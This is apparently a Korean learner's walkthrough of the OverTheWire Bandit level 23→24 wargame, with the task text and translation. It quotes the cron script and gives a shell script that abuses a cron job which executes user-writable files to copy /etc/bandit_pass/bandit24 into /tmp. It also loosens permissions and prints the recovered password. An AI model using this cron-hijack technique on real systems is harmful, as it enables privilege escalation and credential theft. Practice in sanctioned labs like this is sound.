@@ -1,0 +1,82 @@
+문제>
+A program is running automatically at regular intervals from cron, the time-based job scheduler. 
+Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. 
+This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+번역>
+프로그램은 시간 기반 작업 스케줄러인 cron에서 일정한 간격으로 자동으로 실행됩니다.
+/etc/cron.d/에서 구성을 찾고 실행 중인 명령을 확인합니다.
+
+참고: 이 수준을 사용하려면 첫 번째 셸 스크립트를 직접 만들어야 합니다.
+이것은 매우 큰 단계이고 여러분은 이 수준을 넘어설 때 스스로를 자랑스러워해야 합니다!
+
+참고 2: 셸 스크립트가 실행되면 제거되므로 복사본을 보관해야 합니다.
+
+풀이>
+$ cat /usr/bin/cronjob_bandit24.sh
+--------
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;  
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+---------
+# for i in * .*; 반복문으로 * 부터 .*까지
+쉘 해석이 myname은 bandit24 이고 /var/spool/bandit24 들어가 owner가 bandit23 인 파일은 삭제한다는
+것 같다.
+
+도움요청!
+해당 파일위치에 쉘을 만들어서 자동으로 쉘이 실행되고 실행되고 삭제될것이다.
+해당위체이 키값을 볼수 있는 쉘을 만들자.
+$ cd /var/spool/bandit24
+$ vi pass.sh   #i 를 누르면 입력모드(빠져나오기 esc누르기) , :wq로 하면 저장하고 나오기
+------------
+#!/bin/bash                                          
+cat /etc/bandit_pass/bandit24 > /tmp/test/bandit24ps 
+ -----------
+  
+1분마다 쉘이 삭제되긴하는데 이게 .. test 파일까지는 있는데 bandit24ps 파일이 생성이 안된다..
+왜 블로그랑 똑같이 해도 파일이 생성이 안되냐..
+  
+  
+  $ mkdir /tmp/mydir   #내 파일을 생성
+  $ vi /tmp/mydir/shell.sh
+  ---------
+  #!/bin/bash
+  cat /etc/bandit_pass/bandit24 > /tmp/mydir/bandit24ps
+  ---------
+  $ cp /tmp/mydir/shell.sh .     #해당위치 파일을 현재위치로 카피 (현재 위치 /var/spool/bandit24 )
+  $ chmod 777 shell.sh      #  bandit24의 shell.sh파일의 실행권한 주기
+  
+  $ chmod o+w /tmp/mydir   #bandit24ps파일을 만드는 소유자가 bandit24이므로 현재 mydir은 bandit23만
+  쓸수 있음 그래서 chmod로 o+w 를 해야함.
+  기달리다보면은 
+  $ ls -al /tmp/mydir 을 하면은 bandit24ps 파일이 추가된것을 볼수 있음
+  $ cat /tmp/mydir/bandit24ps    #    UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+  
+  블로거에게 감사해야겠다 !   https://jiravvit.tistory.com/entry/OverTheWire-Bandit-level23-level24
+  
+  
+  
+  
+
+
+
+
